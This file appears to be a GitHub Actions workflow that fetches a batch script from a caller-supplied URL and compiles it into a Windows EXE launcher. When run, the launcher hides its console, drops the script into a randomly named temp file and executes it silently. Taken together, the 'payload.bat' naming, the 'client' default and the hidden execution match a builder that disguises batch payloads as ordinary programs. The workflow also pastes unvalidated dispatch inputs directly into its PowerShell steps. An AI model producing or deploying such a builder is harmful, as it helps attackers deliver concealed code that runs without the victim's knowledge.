name: Build BAT EXE

run-name: Build ${{ inputs.job }}

on:
  workflow_dispatch:
    inputs:
      job:
        description: Job ID
        required: true
        type: string
      file_url:
        description: URL to download .bat
        required: true
        type: string
      name:
        description: Output EXE name
        required: false
        default: client
        type: string

  repository_dispatch:
    types: [convert_bat]

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Resolve inputs
        id: cfg
        shell: pwsh
        run: |
          if ($env:GITHUB_EVENT_NAME -eq "repository_dispatch") {
            $job = "${{ github.event.client_payload.job_id }}"
            $url = "${{ github.event.client_payload.file_url }}"
            $name = "${{ github.event.client_payload.name }}"
            if (-not $name) { $name = "client" }
          } else {
            $job = "${{ inputs.job }}"
            $url = "${{ inputs.file_url }}"
            $name = "${{ inputs.name }}"
          }
          if (-not $name) { $name = "client" }
          "job=$job" >> $env:GITHUB_OUTPUT
          "url=$url" >> $env:GITHUB_OUTPUT
          "name=$name" >> $env:GITHUB_OUTPUT
          Write-Host "job=$job name=$name"

      - name: Download BAT
        shell: pwsh
        env:
          FILE_URL: ${{ steps.cfg.outputs.url }}
        run: |
          Invoke-WebRequest -Uri $env:FILE_URL -OutFile "payload.bat" -UseBasicParsing
          if (-not (Test-Path "payload.bat")) { throw "download failed" }
          $len = (Get-Item "payload.bat").Length
          Write-Host "bat size=$len"

      - name: Build launcher EXE (csc)
        shell: pwsh
        env:
          APP_NAME: ${{ steps.cfg.outputs.name }}
        run: |
          $bat = [IO.File]::ReadAllText("payload.bat")
          # escape for C# verbatim string
          $escaped = $bat.Replace('"', '""')
          $safe = ($env:APP_NAME -replace '[^A-Za-z0-9._-]', '_')
          if (-not $safe) { $safe = "client" }

          $cs = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class Program {
  [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  static void Main() {
    try {
      var hw = GetConsoleWindow();
      if (hw != IntPtr.Zero) ShowWindow(hw, 0);
    } catch {}
    string bat = @"$escaped";
    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
    File.WriteAllText(path, bat);
    var psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c \"" + path + "\"";
    psi.WindowStyle = ProcessWindowStyle.Hidden;
    psi.CreateNoWindow = true;
    psi.UseShellExecute = false;
    try { Process.Start(psi); } catch {}
  }
}
"@
          [IO.File]::WriteAllText("launcher.cs", $cs)

          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
          if (-not (Test-Path $csc)) {
            $csc = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
          }
          if (-not (Test-Path $csc)) { throw "csc.exe not found" }

          New-Item -ItemType Directory -Force -Path dist | Out-Null
          & $csc /nologo /target:winexe /optimize+ /out:"dist\$safe.exe" launcher.cs
          if (-not (Test-Path "dist\$safe.exe")) { throw "compile failed" }
          Write-Host "built dist\$safe.exe size=$((Get-Item dist\$safe.exe).Length)"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: converted_exe
          path: dist/*.exe
          if-no-files-found: error
          retention-days: 1
